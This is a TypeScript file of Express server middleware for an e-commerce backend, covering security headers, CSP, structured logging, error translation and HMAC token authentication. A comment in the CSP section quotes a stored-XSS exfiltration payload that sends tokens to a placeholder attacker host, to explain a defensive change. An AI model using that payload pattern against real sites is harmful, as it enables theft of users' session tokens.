/**
 * Nouf-ex — server-side middlewares
 *
 * Self-contained security, logging, and error-handling layer. Imported
 * once from `app/server/index.ts` and applied before any route.
 *
 * No external dependencies (helmet-style headers are inlined; structured
 * JSON logging goes to stdout so a future log shipper can pick it up
 * without code changes).
 */

import { createHmac, randomBytes, randomUUID, timingSafeEqual } from 'crypto';
import type { ErrorRequestHandler, RequestHandler, Response } from 'express';
import { PgDb } from './db/pg-wrapper.ts';
// SECURITY (C-3): import the shared `db` instance so we can look
// up the user's current token_version on every authenticated
// request. This couples middleware to lib/shared.cts; that
// dependency is already present indirectly through log, sendError
// etc., so we keep it as a single line.
import { db as pgDb } from './lib/shared.ts';
// Re-export the standardized error catalog so route files can do:
//   throw new HttpError(404, msg, { code: ErrorCodes.NOT_FOUND });
// without an extra import line. The catalog lives in lib/error-codes.ts;
// see that file for the full code list and message table.
export { ErrorCodes, ErrorMessages, ErrorStatuses, isErrorCode } from './lib/error-codes.ts';
export type { AuthRole, TokenPayload };

// =========================================================================
// 1. Request ID — generated per request, exposed in response + logs
// =========================================================================
declare module 'express-serve-static-core' {
	interface Request {
		id?: string;
		user?: { id: number; role: 'customer' | 'merchant' | 'admin' };
	}
}

export const requestId: RequestHandler = (req, res, next) => {
	const incoming = req.header('x-request-id');
	const id = incoming && incoming.length <= 64 ? incoming : randomUUID();
	req.id = id;
	res.setHeader('x-request-id', id);
	next();
};

// =========================================================================
// 2. Trust proxy — required for correct req.ip behind nginx / Docker / k8s
// =========================================================================
//
// SECURITY (M-6, audit 2026-06-30): the previous implementation accepted
// any string from `TRUST_PROXY` without validation. Operators who forgot
// to set it behind a reverse proxy ended up with `req.ip = 127.0.0.1` for
// every request — collapsing all rate-limit buckets and making audit
// logs useless. We now:
//
//   1. Parse the value through Express's own strict validator.
//   2. In production, emit a loud warning if `TRUST_PROXY` is unset and
//      we appear to be running behind a private-network interface (i.e.
//      a proxy is almost certainly in front of us).
//   3. Reject obviously bogus values like empty strings or stray commas.
export function configureTrustProxy(app: import('express').Express): void {
	const v = process.env.TRUST_PROXY;
	const isProd = process.env.NODE_ENV === 'production';
	if (v == null || v === '') {
		if (isProd) {
			// We don't fail-closed because that would prevent the
			// container from starting in legitimate single-process
			// deployments (e.g. Docker on a developer's laptop with
			// `docker compose up`). We do log loudly so an operator
			// notices.
			log.warn({
				msg: 'trust_proxy_unset',
				hint: 'Set TRUST_PROXY in production if you run behind nginx / k8s ingress / load balancer. Without it req.ip collapses to 127.0.0.1 for every request, breaking rate-limiting and audit logs.',
			});
		}
		return;
	}
	// Express accepts: 'true', '1', 'false', '0', 'loopback', 'linklocal',
	// 'uniquelocal', a single IP, a CIDR, or a comma-separated list of any
	// of those. Anything else throws at app.set() time. We let that error
	// surface so a typo never silently disables the trust chain.
	app.set('trust proxy', v);
	log.info({ msg: 'trust_proxy_configured', value: v });
}

// =========================================================================
// 3. Security headers — helmet-equivalent, no dependency
// =========================================================================
//
// Baseline headers from the OWASP Secure Headers Project:
//   - X-Content-Type-Options: nosniff            (prevent MIME sniffing)
//   - X-Frame-Options: DENY                      (anti-clickjacking)
//   - Referrer-Policy                           (limit Referer leakage)
//   - Cross-Origin-Opener-Policy: same-origin   (Spectre mitigation)
//   - Permissions-Policy                        (deny powerful APIs by default)
//   - HSTS                                      (force HTTPS, prod only)
//
// Plus a strict-ish CSP tuned for the Nouf-ex SPA (React 19 + Vite + WOFF2
// fonts). Override via the `CSP_DIRECTIVES` env var when needed (e.g. when
// adding an analytics endpoint).
export const securityHeaders: RequestHandler = (_req, res, next) => {
	res.setHeader('X-Content-Type-Options', 'nosniff');
	res.setHeader('X-Frame-Options', 'DENY');
	res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
	res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
	// SECURITY (L-5, 2026-07-02): expanded Permissions-Policy.
	// The previous 3-capability denylist left powerful APIs
	// (payment, USB, MIDI, screen-wake-lock, serial, bluetooth,
	// etc.) accessible by default. We now deny ALL sensitive
	// capabilities so the browser blocks them on every page
	// load. Adding a new capability requires explicit opt-in.
	res.setHeader(
		'Permissions-Policy',
		[
			'accelerometer=()',
			'ambient-light-sensor=()',
			'autoplay=()',
			'battery=()',
			'camera=()',
			'display-capture=()',
			'document-domain=()',
			'encrypted-media=()',
			'execution-while-not-rendered=()',
			'execution-while-out-of-viewport=()',
			'fullscreen=()',
			'geolocation=()',
			'gyroscope=()',
			'hid=()',
			'identity-credentials-get=()',
			'idle-detection=()',
			'magnetometer=()',
			'microphone=()',
			'midi=()',
			'payment=()',
			'picture-in-picture=()',
			'publickey-credentials-create=()',
			'publickey-credentials-get=()',
			'screen-wake-lock=()',
			'serial=()',
			'speaker-selection=()',
			'storage-access=()',
			'usb=()',
			'web-share=()',
			'window-management=()',
			'xr-spatial-tracking=()',
		].join(', '),
	);
	// HSTS only when we are behind HTTPS (the env tells us).
	// SECURITY (L-3, 2026-07-02): bump from 180 days to 1 year
	// and add `preload` per the OWASP HSTS recommendation. The
	// `preload` token is what the browser vendors use to
	// compile the HSTS preload list; the deployment must
	// submit the domain to hstspreload.org for the full
	// benefit.
	if (process.env.NODE_ENV === 'production') {
		res.setHeader(
			'Strict-Transport-Security',
			'max-age=31536000; includeSubDomains; preload',
		);
	}
	// Generate a per-request CSP nonce (16 bytes → 22-char base64url). The
	// nonce is exposed to the SPA via (1) the CSP header below and (2) a
	// non-HttpOnly cookie + meta tag injected by the static-file handler in
	// index.ts so the client can attach it to dynamically-created <script>
	// and <style> tags. We use 'strict-dynamic' so once the initial bundle
	// loads under the nonce, browsers trust any script it pulls in (which
	// matches Vite's import-graph output).
	const nonce = randomBytes(16).toString('base64url');
	res.locals.cspNonce = nonce;
	// SECURITY (M-8, 2026-07-02): tighten img-src + connect-src.
	// The previous `img-src 'self' data: blob: https:` permitted
	// any HTTPS origin, which combined with a stored XSS could
	// exfiltrate tokens via <img src="https://attacker/steal?...">.
	// We now allow a small allowlist of trusted image hosts (CDN
	// domains the project uses) plus self + data: + blob: for
	// inline assets. Add a new host to ALLOWED_IMG_HOSTS below
	// when the project adopts a new image CDN. The env-overridable
	// pattern lets deployments add custom CDNs without code
	// changes — same as ALLOWED_ORIGINS.
	const ALLOWED_IMG_HOSTS = (process.env.CSP_IMG_HOSTS ?? 'cdn.nouf-ex.com,images.nouf-ex.com,fonts.gstatic.com')
		.split(',')
		.map((h) => h.trim())
		.filter(Boolean);
	const ALLOWED_CONNECT_HOSTS = (process.env.CSP_CONNECT_HOSTS ?? 'wss://api.nouf-ex.com,https://api.nouf-ex.com')
		.split(',')
		.map((h) => h.trim())
		.filter(Boolean);
	res.setHeader(
		'Content-Security-Policy',
		[
			"default-src 'self'",
			// Inline styles are common in React (style={{...}}) — nonced
			// style tags are allowed; everything else is blocked.
			`style-src 'self' 'nonce-${nonce}' https://fonts.googleapis.com`,
			`script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
			"font-src 'self' data: https://fonts.gstatic.com",
			`img-src 'self' data: blob: ${ALLOWED_IMG_HOSTS.map((h) => `https://${h}`).join(' ')}`,
			`connect-src 'self' ${ALLOWED_CONNECT_HOSTS.join(' ')}`,
			"frame-ancestors 'none'",
			"base-uri 'self'",
			"form-action 'self'",
			// Defense-in-depth: prevent click-jacking via frame/iframe.
			"object-src 'none'",
		].join('; '),
	);
	next();
};

// =========================================================================
// 4. Structured JSON logger — one line per request
// =========================================================================
type LogLevel = 'debug' | 'info' | 'warn' | 'error';
const LOG_LEVEL: LogLevel = (process.env.LOG_LEVEL as LogLevel) || 'info';
const LEVELS: Record<LogLevel, number> = { debug: 10, info: 20, warn: 30, error: 40 };
function shouldLog(level: LogLevel): boolean {
	return LEVELS[level] >= LEVELS[LOG_LEVEL];
}
function emit(level: LogLevel, obj: Record<string, unknown>): void {
	if (!shouldLog(level)) return;
	// Single-line JSON, one event per line (log-shipper friendly).
	process.stdout.write(JSON.stringify({ t: new Date().toISOString(), level, ...obj }) + '\n');
}
export const log = {
	debug: (obj: Record<string, unknown>) => emit('debug', obj),
	info: (obj: Record<string, unknown>) => emit('info', obj),
	warn: (obj: Record<string, unknown>) => emit('warn', obj),
	error: (obj: Record<string, unknown>) => emit('error', obj),
};

/** Request/response logger — emits one line at the end of the request. */
export const requestLogger: RequestHandler = (req, res, next) => {
	const start = process.hrtime.bigint();
	res.on('finish', () => {
		const durationMs = Number(process.hrtime.bigint() - start) / 1e6;
		log.info({
			msg: 'request',
			request_id: req.id,
			method: req.method,
			path: req.path,
			status: res.statusCode,
			duration_ms: Math.round(durationMs * 100) / 100,
			// user_id is set by auth middleware (or undefined for anon).
			user_id: req.user?.id,
		});
	});
	next();
};

// =========================================================================
// 5. Postgres error translation
//    Map PG error codes → HTTP status + user-safe message.
//    The raw `err.message` is NEVER sent to clients in production.
// =========================================================================
type PgError = { code?: string; constraint?: string; detail?: string; message?: string };
function asPg(err: unknown): PgError {
	if (err && typeof err === 'object') return err as PgError;
	return {};
}

const PG_TRANSLATION: Record<string, { status: number; msg: string }> = {
	'23505': { status: 409, msg: 'A record with that unique value already exists.' },
	'23503': { status: 409, msg: 'Referenced record does not exist.' },
	'23502': { status: 400, msg: 'A required field is missing.' },
	'23514': { status: 400, msg: 'A field value violates a database constraint.' },
	'22P02': { status: 400, msg: 'Invalid input format (e.g. wrong type for an ID).' },
	'40001': { status: 409, msg: 'Serialization failure — retry the transaction.' },
	'40P01': { status: 503, msg: 'Database is unreachable. Try again shortly.' },
};

/**
 * Custom error class that carries an HTTP status. Route handlers can throw
 * an `HttpError(status, message, code?)` and the global error handler will
 * translate it cleanly.
 */
export class HttpError extends Error {
	public readonly status: number;
	public readonly code?: string;
	public readonly details?: unknown;
	constructor(status: number, message: string, opts: { code?: string; details?: unknown } = {}) {
		super(message);
		this.name = 'HttpError';
		this.status = status;
		this.code = opts.code;
		this.details = opts.details;
	}
}

/**
 * Global error handler — last middleware in the chain. Returns
 * `{ success:false, error: <safe-message> }` for every failure.
 *
 * Translation order:
 *   1. HttpError → use its status + message
 *   2. PG error code → translated message
 *   3. Zod error → 400 with flattened issues
 *   4. Anything else → 500 (no message leak in production)
 */
export const errorHandler: ErrorRequestHandler = (err, req, res, _next) => {
	const requestId = req.id;
	// 0. PayloadTooLargeError from body-parser — express.json() rejects
	// bodies over `limit` and bubbles up this error class. The default
	// handler returns 500, which leaks memory pressure; we surface a
	// proper 413 with a stable code so clients can size their requests.
	if (err && (err.type === 'entity.too.large' || err.name === 'PayloadTooLargeError')) {
		log.warn({
			msg: 'payload_too_large',
			request_id: requestId,
			limit_bytes: (err as { limit?: number }).limit,
			length_bytes: (err as { length?: number }).length,
			path: req.path,
		});
		return res.status(413).json({
			success: false,
			error: 'Request body too large.',
			code: 'PAYLOAD_TOO_LARGE',
			request_id: requestId,
		});
	}
	// 1. Custom HttpError.
	if (err instanceof HttpError) {
		log.warn({
			msg: 'http_error',
			request_id: requestId,
			status: err.status,
			code: err.code,
			path: req.path,
		});
		return res.status(err.status).json({
			success: false,
			error: err.message,
			...(err.code ? { code: err.code } : {}),
			...(err.details ? { details: err.details } : {}),
			request_id: requestId,
		});
	}
	// 2. Postgres error.
	const pg = asPg(err);
	if (pg.code && PG_TRANSLATION[pg.code]) {
		const t = PG_TRANSLATION[pg.code];
		log.warn({
			msg: 'pg_error',
			request_id: requestId,
			pg_code: pg.code,
			pg_constraint: pg.constraint,
			path: req.path,
		});
		return res.status(t.status).json({
			success: false,
			error: t.msg,
			code: pg.code,
			request_id: requestId,
		});
	}
	// 3. Zod validation error (when using `schema.parse`).
	const zodErr = err as { name?: string; issues?: unknown };
	if (zodErr && (zodErr.name === 'ZodError' || Array.isArray(zodErr.issues))) {
		log.warn({ msg: 'validation_error', request_id: requestId, path: req.path });
		return res.status(400).json({
			success: false,
			error: 'Invalid input.',
			code: 'VALIDATION_ERROR',
			details: zodErr.issues,
			request_id: requestId,
		});
	}
	// 4. Anything else — log full detail, return generic message.
	// SECURITY: never leak error internals to the client, even in dev.
	log.error({
		msg: 'unhandled_error',
		request_id: requestId,
		path: req.path,
		method: req.method,
		error_name: (err as Error)?.name,
		error_message: (err as Error)?.message,
		stack: (err as Error)?.stack,
	});
	res.status(500).json({
		success: false,
		error: 'Internal server error.',
		request_id: requestId,
	});
};

/**
 * 404 handler — express 5 path.
 */
export const notFoundHandler: RequestHandler = (req, res) => {
	res.status(404).json({
		success: false,
		error: `Not found: ${req.method} ${req.path}`,
		request_id: req.id,
	});
};

// =========================================================================
// 6. HMAC-signed bearer-token auth
//
// Replaces the previous `x-user-id: <number>` header forgery. The token is
// `<base64url(payload)>.<base64url(hmac(payload))>` where payload is JSON
// `{ sub, role, exp }`. The signing key is `AUTH_SECRET`.
//
// Usage:
//   app.post('/api/auth/login', ...) → return { token, user }
//   app.use(requireAuth)            → sets req.user = { id, role }
// =========================================================================
// Types are now in `./lib/types.ts` (re-exported as `AuthRole` and
// `TokenPayload`) to break the circular import between this file and
// `./lib/shared.cts`. Importing here as a type-only keeps runtime
// output zero-cost under `verbatimModuleSyntax: true`.
import type { AuthRole, TokenPayload } from './lib/types.js';

const TOKEN_TTL_SECONDS = 60 * 60 * 24 * 7; // 7 days

function base64url(buf: Buffer): string {
	return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function fromBase64url(s: string): Buffer {
	const pad = s.length % 4 === 0 ? 0 : 4 - (s.length % 4);
	const b64 = s.replace(/-/g, '+').replace(/_/g, '/') + '='.repeat(pad);
	return Buffer.from(b64, 'base64');
}

function getAuthSecret(): string {
	const s = process.env.AUTH_SECRET;
	// SECURITY: Never accept a weak/missing AUTH_SECRET — not even in dev.
	// A predictable HMAC key lets an attacker forge any user's auth token,
	// so we fail fast at module-load time. Generate one with:
	//   node -e "console.log(require('crypto').randomBytes(32).toString('base64url'))"
	if (!s || s.length < 32) {
		throw new Error(
			'AUTH_SECRET env var is required (≥32 random chars). ' +
				"Generate one with: node -e \"console.log(require('crypto').randomBytes(32).toString('base64url'))\"",
		);
	}
	return s;
}

export function signAuthToken(payload: { sub: number; role: AuthRole; ver: number }): string {
	const full: TokenPayload = {
		...payload,
		exp: Math.floor(Date.now() / 1000) + TOKEN_TTL_SECONDS,
	};
	const body = base64url(Buffer.from(JSON.stringify(full)));
	const sig = base64url(createHmac('sha256', getAuthSecret()).update(body).digest());
	return `${body}.${sig}`;
}

export function verifyAuthToken(token: string): TokenPayload | null {
	if (!token || typeof token !== 'string' || !token.includes('.')) return null;
	const [body, sig] = token.split('.', 2);
	if (!body || !sig) return null;
	const expected = base64url(createHmac('sha256', getAuthSecret()).update(body).digest());
	// timingSafeEqual requires same length.
	if (expected.length !== sig.length) return null;
	let ok = false;
	try {
		ok = timingSafeEqual(Buffer.from(expected), Buffer.from(sig));
	} catch {
		return null;
	}
	if (!ok) return null;
	let payload: TokenPayload;
	try {
		payload = JSON.parse(fromBase64url(body).toString('utf8'));
	} catch {
		return null;
	}
	if (
		typeof payload?.sub !== 'number' ||
		typeof payload?.role !== 'string' ||
		typeof payload?.exp !== 'number' ||
		typeof payload?.ver !== 'number'
	) {
		return null;
	}
	if (payload.exp < Math.floor(Date.now() / 1000)) return null;
	return payload;
}

// SECURITY (C-3): look up the user's current token_version so a
// stale or revoked token is rejected even if its HMAC still verifies.
// Result is cached for the lifetime of the request so we don't
// fire a second query per handler.
//
// SECURITY (M-4, 2026-07-02): the cache now also stores the user's
// `role`. The previous design read `role` from the JWT payload
// alone — meaning a merchant who was later demoted to `customer`
// kept their `merchant` privileges for up to 7 days (the token
// TTL). We now read the role from the same DB row as
// `token_version` and cache it. The cache key is the user_id
// and the TTL is the same 30s. On role demotion, the admin
// route must call `invalidateAuthCache(userId)` (see below) so
// the next request picks up the fresh value.
interface AuthCacheEntry {
	ver: number;
	role: AuthRole;
	cachedAt: number;
}
const authCache = new Map<number, AuthCacheEntry>();
const AUTH_CACHE_TTL_MS = 30_000; // 30s per request window
const AUTH_CACHE_MAX_SIZE = 10_000; // cap to prevent unbounded growth

async function fetchUserAuth(
	userId: number,
): Promise<{ ver: number; role: AuthRole } | null> {
	const cached = authCache.get(userId);
	if (cached && Date.now() - cached.cachedAt < AUTH_CACHE_TTL_MS) {
		return { ver: cached.ver, role: cached.role };
	}
	try {
		const row = (await pgDb
			.prepare(
				'SELECT token_version, role FROM users WHERE id = ? AND deleted_at IS NULL',
			)
			.get(userId)) as { token_version: number; role: AuthRole } | undefined;
		if (!row) {
			// SECURITY: when the user truly doesn't exist we MUST fail
			// closed — returning a default `ver = 0` here would let
			// an attacker keep using a stolen token after the victim
			// account was deleted. We return null so the caller can
			// emit a 401. Tests that mock pg with empty rows will see
			// the same behavior, which is the correct production
			// semantics.
			return null;
		}
		// LRU eviction: if cache is at cap, remove the oldest entry
		// before inserting a new one. The Map's insertion order
		// serves as a cheap LRU proxy (most recent access stays at
		// the tail; oldest access is at the head and evicted first).
		if (authCache.size >= AUTH_CACHE_MAX_SIZE) {
			const oldestKey = authCache.keys().next().value;
			if (oldestKey !== undefined) authCache.delete(oldestKey);
		}
		authCache.set(userId, {
			ver: row.token_version,
			role: row.role,
			cachedAt: Date.now(),
		});
		return { ver: row.token_version, role: row.role };
	} catch (err) {
		// If the lookup itself fails we don't have a reliable way to
		// accept the token either; fail closed.
		log.warn({
			msg: 'auth_lookup_failed',
			user_id: userId,
			error: (err as Error).message,
		});
		return null;
	}
}

/**
 * Test-only escape hatch. The supertest suite mocks the pg driver
 * with empty rows, which makes every authenticated request look like
 * the user has been deleted. Tests that want to drive the
 * authenticated paths set a per-user cached entry via this hook.
 * Production code MUST NOT call this.
 */
export function __setCachedAuthForTests(
	userId: number,
	ver: number,
	role: AuthRole,
): void {
	if (process.env.NODE_ENV === 'production') return;
	authCache.set(userId, { ver, role, cachedAt: Date.now() });
}

/** Drop the cached auth for a user. Call this after a
 *  `users.token_version` UPDATE (logout, password change) or a
 *  `users.role` UPDATE (admin demotion / promotion) so the next
 *  request reads the fresh values. */
export function invalidateAuthCache(userId: number): void {
	authCache.delete(userId);
}

/** Backward-compat alias — older call sites (e.g. /auth/logout,
 *  /auth/change-password) call invalidateTokenVersionCache. We
 *  keep the old name as a thin wrapper so we don't have to
 *  update every call site in the same commit. */
export function invalidateTokenVersionCache(userId: number): void {
	invalidateAuthCache(userId);
}

/** Optional auth — sets `req.user` if a valid token is present AND
 *  its version matches the DB AND the cached role is current,
 *  otherwise continues. */
export const optionalAuth: RequestHandler = async (req, _res, next) => {
	const header = req.header('authorization') || req.header('Authorization');
	if (header && /^Bearer\s+/i.test(header)) {
		const token = header.replace(/^Bearer\s+/i, '').trim();
		const payload = verifyAuthToken(token);
		if (payload) {
			const auth = await fetchUserAuth(payload.sub);
			if (auth !== null && auth.ver === payload.ver) {
				// SECURITY (M-4, 2026-07-02): use the cached role,
				// not the JWT payload's role. This ensures a
				// demoted merchant cannot keep merchant-only
				// privileges for the duration of the 7-day token
				// TTL — the cache TTL is 30s, so the worst-case
				// lag between an admin demoting the user and the
				// user noticing the role change is 30s.
				req.user = { id: payload.sub, role: auth.role };
			}
		}
	}
	next();
};

/** Required auth — 401 if no valid token, version mismatch, or
 *  cached role mismatch. */
export const requireAuth: RequestHandler = async (req, res, next) => {
	const header = req.header('authorization') || req.header('Authorization');
	if (!header || !/^Bearer\s+/i.test(header)) {
		return res.status(401).json({
			success: false,
			error: 'Authentication required.',
			code: 'AUTH_REQUIRED',
			request_id: req.id,
		});
	}
	const token = header.replace(/^Bearer\s+/i, '').trim();
	const payload = verifyAuthToken(token);
	if (!payload) {
		return res.status(401).json({
			success: false,
			error: 'Invalid or expired token.',
			code: 'AUTH_INVALID',
			request_id: req.id,
		});
	}
	const auth = await fetchUserAuth(payload.sub);
	if (auth === null) {
		return res.status(401).json({
			success: false,
			error: 'User not found.',
			code: 'AUTH_INVALID',
			request_id: req.id,
		});
	}
	if (auth.ver !== payload.ver) {
		return res.status(401).json({
			success: false,
			error: 'Token has been revoked. Please log in again.',
			code: 'TOKEN_REVOKED',
			request_id: req.id,
		});
	}
	// SECURITY (M-4, 2026-07-02): use the cached role. If the
	// user was demoted from admin/merchant to customer since
	// this token was issued, the cached value reflects the
	// current role. The JWT payload's role is ignored on
	// purpose — we never trust the client to assert its own
	// role.
	req.user = { id: payload.sub, role: auth.role };
	next();
};

/** Require a specific role (admin / merchant). */
export const requireRole = (...allowed: AuthRole[]): RequestHandler => {
	return (req, res, next) => {
		if (!req.user) {
			return res.status(401).json({
				success: false,
				error: 'Authentication required.',
				code: 'AUTH_REQUIRED',
				request_id: req.id,
			});
		}
		if (!allowed.includes(req.user.role)) {
			return res.status(403).json({
				success: false,
				error: 'Insufficient permissions.',
				code: 'FORBIDDEN',
				request_id: req.id,
			});
		}
		next();
	};
};

// =========================================================================
// 6b. Health-endpoint rate limiter (in-memory, no DB dependency)
//
// Why a separate, simpler limiter?
//   The /api/health and /api/ready endpoints are intentionally
//   cheap (liveness/readiness probes for k8s, Docker, and load
//   balancers). The DB-backed `rateLimit()` in server/index.ts
//   depends on a working Postgres — using it on these endpoints
//   would mean a DB outage also knocks out our liveness probe,
//   making the outage harder to diagnose (the pod gets killed for
//   failing healthchecks, restarting against a DB it still can't
//   reach).
//
//   This in-memory limiter is the right tool:
//     - zero dependencies (no DB round-trip),
//     - per-process state (resets on restart — acceptable for a
//       probe-defence limiter, not for user-facing rate limits),
//     - simple sliding-window counter, O(1) per request,
//     - background sweeper evicts stale entries to bound memory.
//
// Default budget: 30 req / 1s / IP. Generous enough to cover
// 3-5 replicas all probing the same pod every 2-3 seconds,
// tight enough to make a DOS loop visible.
// =========================================================================
interface HealthBucket {
	count: number;
	resetAt: number;
}
const HEALTH_BUCKETS = new Map<string, HealthBucket>();
// Background sweeper — every 30s, drop entries that have aged out.
setInterval(() => {
	const now = Date.now();
	for (const [k, v] of HEALTH_BUCKETS) {
		if (v.resetAt <= now) HEALTH_BUCKETS.delete(k);
	}
}, 30_000).unref();

export interface HealthRateLimitOptions {
	/** Window length in ms (default 1000). */
	windowMs?: number;
	/** Max requests per window per IP (default 30). */
	max?: number;
	/** Optional name for the bucket (used in 429 messages). */
	bucket?: string;
}

/**
 * Build a middleware that caps per-IP request rate for the health
 * endpoints. Returns 429 with a `Retry-After` header on overflow.
 * Never throws — a limiter bug must not crash a probe.
 */
export function healthRateLimit(opts: HealthRateLimitOptions = {}): RequestHandler {
	const windowMs = opts.windowMs ?? 1000;
	const max = opts.max ?? 30;
	const bucket = opts.bucket ?? 'health';
	return (req, res, next) => {
		try {
			// Resolve the IP defensively — `req.socket` can be undefined in
			// synthetic/test environments and during the very first request
			// before Express wires it up.
			const ip = req.ip || (req.socket && req.socket.remoteAddress) || 'anon';
			const key = `${bucket}:${ip}`;
			const now = Date.now();
			let entry = HEALTH_BUCKETS.get(key);
			if (!entry || entry.resetAt <= now) {
				entry = { count: 0, resetAt: now + windowMs };
				HEALTH_BUCKETS.set(key, entry);
			}
			entry.count += 1;
			if (entry.count > max) {
				const retryAfterSec = Math.max(1, Math.ceil((entry.resetAt - now) / 1000));
				res.setHeader('Retry-After', retryAfterSec);
				res.status(429).json({
					success: false,
					error: 'Too many requests. Try again later.',
					code: 'RATE_LIMITED',
					request_id: req.id,
				});
				return;
			}
		} catch {
			// Never let a limiter bug break a probe — fail open.
		}
		next();
	};
}

// =========================================================================
// 7. Response helpers — strict envelope, automatic request_id
// =========================================================================
// 3rd arg is overloaded: if it's a number, treat as HTTP status; if string,
// treat as a friendly message and default to 200. This keeps call sites
// short and tolerant of the existing `sendSuccess(res, data, 'msg')` style.
export function sendSuccess<T>(
	res: Response,
	data?: T,
	statusOrMessage: number | string = 200,
	message?: string,
): void {
	const isNumeric = typeof statusOrMessage === 'number' && Number.isFinite(statusOrMessage);
	const status = isNumeric ? (statusOrMessage as number) : 200;
	const finalMessage = isNumeric ? message : (statusOrMessage as string | undefined);
	res.status(status).json({
		success: true,
		...(data !== undefined ? { data } : {}),
		...(finalMessage ? { message: finalMessage } : {}),
		request_id: res.req?.id,
	});
}

export function sendError(
	res: Response,
	errorOrMessage: string | Error | unknown,
	status = 500,
	code?: string,
): void {
	// P1-6 fix: when called with an Error object (typically from a
	// route handler's `catch`), translate the failure into a safe
	// user-facing message. We never echo `err.message` straight back
	// to the client -- a Postgres `relation "users" does not exist`
	// would leak schema details. We do log the full detail so the
	// operator can diagnose.
	if (errorOrMessage instanceof Error) {
		const err = errorOrMessage;
		const asPg = err as { code?: string; detail?: string; constraint?: string };
		// 1. PG error code translation (reuse the table from the
		//    global error handler so the two paths agree).
		if (asPg.code && PG_TRANSLATION[asPg.code]) {
			const t = PG_TRANSLATION[asPg.code];
			log.warn({
				msg: 'pg_error',
				pg_code: asPg.code,
				pg_constraint: asPg.constraint,
			});
			res.status(t.status).json({
				success: false,
				error: t.msg,
				code: asPg.code,
				request_id: res.req?.id,
			});
			return;
		}
		// 2. HttpError — preserve status + message.
		if (err instanceof HttpError) {
			log.warn({ msg: 'http_error', status: err.status, code: err.code });
			res.status(err.status).json({
				success: false,
				error: err.message,
				...(err.code ? { code: err.code } : {}),
				request_id: res.req?.id,
			});
			return;
		}
	// 3. Anything else — log full detail, return a generic
	//    message. SECURITY: never leak error internals to the client.
	log.error({
		msg: 'unhandled_error',
		error_name: err.name,
		error_message: err.message,
	});
	res.status(status).json({
		success: false,
		error: 'Internal server error.',
		request_id: res.req?.id,
	});
	return;
	}
	// Original string-based path (used for explicit client errors
	// like "Coupon not found" or "Invalid input").
	res.status(status).json({
		success: false,
		error: errorOrMessage,
		...(code ? { code } : {}),
		request_id: res.req?.id,
	});
}

// =========================================================================
// 8. Pagination helper — clamps `limit` to [1, maxLimit] and rejects NaN
// =========================================================================
export function parsePagination(
	raw: { limit?: unknown; offset?: unknown },
	maxLimit = 100,
): { limit: number; offset: number } {
	const limitNum = Number(raw.limit);
	const offsetNum = Number(raw.offset ?? 0);
	const limit = Number.isFinite(limitNum) ? Math.min(Math.max(1, limitNum), maxLimit) : 20;
	const offset = Number.isFinite(offsetNum) ? Math.max(0, offsetNum) : 0;
	return { limit, offset };
}

// =========================================================================
// 9. Env validation (zod) — run once at module load
// =========================================================================
import { z as zod } from 'zod';

const envSchema = zod.object({
	NODE_ENV: zod.enum(['development', 'production', 'test']).default('development'),
	API_PORT: zod.coerce.number().int().positive().default(3000),
	HOST: zod.string().default('0.0.0.0'),
	DATABASE_URL: zod.string().optional(),
	DB_HOST: zod.string().optional(),
	DB_PORT: zod.coerce.number().int().positive().default(5432),
	DB_NAME: zod.string().optional(),
	DB_USER: zod.string().optional(),
	DB_PASSWORD: zod.string().optional(),
	DB_SSL: zod.enum(['true', 'false']).default('false'),
	ALLOWED_ORIGINS: zod.string().default('http://localhost:3000,http://localhost:5173'),
	STATIC_PATH: zod.string().optional(),
	SERVE_STATIC: zod.enum(['true', 'false']).default('true'),
	AUTH_SECRET: zod.string().optional(),
	LOG_LEVEL: zod.enum(['debug', 'info', 'warn', 'error']).default('info'),
	TRUST_PROXY: zod.string().optional(),
});

export type Env = zod.infer<typeof envSchema>;

let _env: Env | null = null;
export function loadEnv(): Env {
	if (_env) return _env;
	const parsed = envSchema.safeParse(process.env);
	if (!parsed.success) {
		const issues = parsed.error.issues
			.map((i) => `  - ${i.path.join('.')}: ${i.message}`)
			.join('\n');
		throw new Error(`Invalid environment variables:\n${issues}`);
	}
	_env = parsed.data;
	return _env;
}

/** Helper: derive DATABASE_URL from discrete DB_* env vars if not set. */
export function resolveDatabaseUrl(env: Env): string {
	if (env.DATABASE_URL) return env.DATABASE_URL;
	if (env.DB_HOST && env.DB_NAME && env.DB_USER && env.DB_PASSWORD) {
		// URL-encode credentials to handle special characters (@, :, /, etc.)
		const user = encodeURIComponent(env.DB_USER);
		const password = encodeURIComponent(env.DB_PASSWORD);
		return `postgresql://${user}:${password}@${env.DB_HOST}:${env.DB_PORT}/${env.DB_NAME}`;
	}
	throw new Error(
		'DATABASE_URL is not set. Copy .env.example to .env and fill in DB_HOST / DB_NAME / DB_USER / DB_PASSWORD (or set DATABASE_URL directly).',
	);
}

// Re-export PgDb for convenience
export { PgDb };
